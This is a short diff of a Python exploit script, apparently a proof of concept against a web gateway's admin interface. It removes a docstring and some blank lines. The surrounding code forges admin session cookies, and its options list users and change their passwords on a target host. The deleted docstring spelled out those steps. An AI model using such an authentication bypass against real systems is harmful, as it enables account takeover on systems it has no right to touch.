@@ -7,7 +7,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxy = {}
 
-
 def check_poc1(url, uid=2):
     header = {
         "Cookie": "admin_id=1; gw_admin_ticket=1;",
@@ -47,7 +46,6 @@ def check_poc2(url, user, pwd):
     else:
         return False
 
-
 @click.command()
 @click.option("--target", "-t", help="目标", required=True)
 @click.option("--group", "-g", default=2, help="用户组", type=int)
@@ -57,17 +55,7 @@ def check_poc2(url, user, pwd):
 @click.option("--change-pwd", "-cp", is_flag=True)
 @click.option("--proxy", "proxies")
 def main(target, group, user, pwd, list_user, change_pwd, proxies):
-    """
-    step1 : list users exppoc
-    python exp.py -t https://1.1.1.1 -lu 
-    user1
-    user2
-    ...
-    step2 : change password org
-
-    python exp.py -t https://1.1.1.1 -u user1 -cp 
-
-    """
+   
     global proxy
     if proxies:
         proxy = {
